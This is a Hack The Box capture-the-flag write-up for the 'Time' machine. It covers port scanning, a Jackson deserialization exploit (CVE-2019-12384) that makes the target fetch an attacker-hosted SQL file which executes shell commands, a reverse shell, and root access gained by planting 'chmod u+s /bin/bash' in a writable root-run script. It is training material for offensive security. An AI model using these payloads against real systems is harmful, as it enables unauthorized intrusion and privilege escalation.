---
layout: post
title: "[HTB] Time"
description: "[Machine] - Medium difficulty"
background: '/img/bg-machine.jpg'
tags: [htb]
difficulty: Medium
---

![Time](/img/htb_img/Time_img/Time.png)

OS: Linux
IP: 10.10.10.214
Complete: Yes
Created time: July 16, 2025 5:52 PM
Level: Medium
Status: Done

# Enumeration

## Nmap recon

```bash
❯ sudo nmap -p- --open --min-rate 1500 -T4 -sS -n -Pn -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 17:55 CEST
Initiating SYN Stealth Scan at 17:55
Scanning 10.10.10.214 [65535 ports]
Discovered open port 80/tcp on 10.10.10.214
Discovered open port 22/tcp on 10.10.10.214
Completed SYN Stealth Scan at 17:55, 12.99s elapsed (65535 total ports)
Nmap scan report for 10.10.10.214
Host is up, received user-set (0.042s latency).
Scanned at 2025-07-16 17:55:38 CEST for 13s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds
           Raw packets sent: 65537 (2.884MB) | Rcvd: 65535 (2.621MB)
```

Scripts and versions.

```bash
❯ nmap -p22,80 -sCV -Pn -oN targeted $target       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-16 17:56 CEST
Nmap scan report for 10.10.10.214
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
```

Port 22 (SSH) and 80 (HTTP) open.

## TCP 80 - HTTP

Port 80 is hosting an apache web server version 2.4.41 Codename Ubuntu.

![Json Beautifier](/img/htb_img/Time_img/01.png)

Json Beautifier

---

### Beautify option

The beautify option transforms the string `{"thing":"hug"}` into:

```bash
{
    "thing": "hug"
}
```

---

### Validate option

This page has a online json beautifier & validator program.
On the validator option, if we just enter a character like `s`, it shows the following error:

```bash
Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 's': was expecting ('true', 'false' or 'null')
```

With the same string as before we got the following error:

```bash
Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
```

Quick search for this error and it gives that it’s using Java - Jackson

---

# Foothold

We are going to exploit the **CVE-2019-12384.**

[Jackson gadgets - Anatomy of a vulnerability · Doyensec's Blog](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)

In this link we can find an example payload.

```bash
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.X.X/test.sql'"}]
```

It worked on our machine.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.214 - - [16/Jul/2025 18:08:59] code 404, message File not found
10.10.10.214 - - [16/Jul/2025 18:08:59] "GET /test.sql HTTP/1.1" 404 -
```

---

In the web of this vuln we can find the following example SQL, and we can update it to weaponize our needs:

```bash
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
        String[] command = {"bash", "-c", cmd};
        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
        return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('ping -c 1 10.10.X.X')
```

It sends the pings correctly.

```bash
❯ tshark -i tun0 -f 'icmp'
Capturing on 'tun0'
    1 0.000000000 10.10.10.214 → 10.10.X.X  ICMP 84 Echo (ping) request  id=0x0002, seq=1/256, ttl=63
    2 0.000030346  10.10.X.X → 10.10.10.214 ICMP 84 Echo (ping) reply    id=0x0002, seq=1/256, ttl=64 (request in 1)
```

---

## Reverse shell as Pericles

So, we put the reverse shell on the weaponized SQL file.

```bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.X.X] from (UNKNOWN) [10.10.10.214] 34488
bash: cannot set terminal process group (852): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$
```

### Upgrade shell

```bash
pericles@time:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
pericles@time:/var/www/html$ ^Z
[1]  + 13406 suspended  nc -lvnp 4444

░▒▓      ~/HTB/Machines/Time/scripts                                                                                                                                               TSTP ✘  took 47s       at 18:14:47   ▓▒░
❯ stty raw -echo;fg
[1]  + 13406 continued  nc -lvnp 4444
pericles@time:/var/www/html$ export TERM=xterm
pericles@time:/var/www/html$
```

---

# Privilege Escalation

Although the user has a snap/lxd folder at his home, the user pericles is not part of the lxd group so the lxd exploiting method is not gonna work.

Let’s perform the usual enumerations and after that, we can upload `Linpeas.sh`.

```bash
[+] System timers
```

So, we have some interesting information about that.

```bash
pericles@time:/tmp$ find /etc/systemd/ -name timer_backup.service
/etc/systemd/system/timer_backup.service

pericles@time:/tmp$ cat /etc/systemd/system/timer_backup.service 
[Unit]
Description=Calls website backup
Wants=timer_backup.timer
WantedBy=multi-user.target

[Service]
ExecStart=/usr/bin/systemctl restart web_backup.service
```

It restarts another service:

```bash
pericles@time:/tmp$ cat /etc/systemd/system/web_backup.service
[Unit]
Description=Creates backups of the website

[Service]
ExecStart=/bin/bash /usr/bin/timer_backup.sh
```

So we see that timer_backup.sh script, let’s take a look, because that script is executed as sudo.

```bash
pericles@time:/tmp$ ls -lah /usr/bin/timer_backup.sh 
-rwxrw-rw- 1 pericles pericles 88 Jul 17 16:30 /usr/bin/timer_backup.sh
```

As we can see, that script is owned by pericles, so we can try to modify it to give us a privesc.

```bash
pericles@time:/tmp$ cat /usr/bin/timer_backup.sh 
#!/bin/bash
zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
chmod u+s /bin/bash
```

With that last line we have permission to execute bash as root.

```bash
pericles@time:/tmp$ ls -lah /bin/bash
-rwsr-xr-x 1 root root 1.2M Feb 25  2020 /bin/bash
pericles@time:/tmp$ bash -p
bash-5.0# id
uid=1000(pericles) gid=1000(pericles) euid=0(root) groups=1000(pericles)
bash-5.0# cat /root/root.txt
<REDACTED>
```

---

---

---
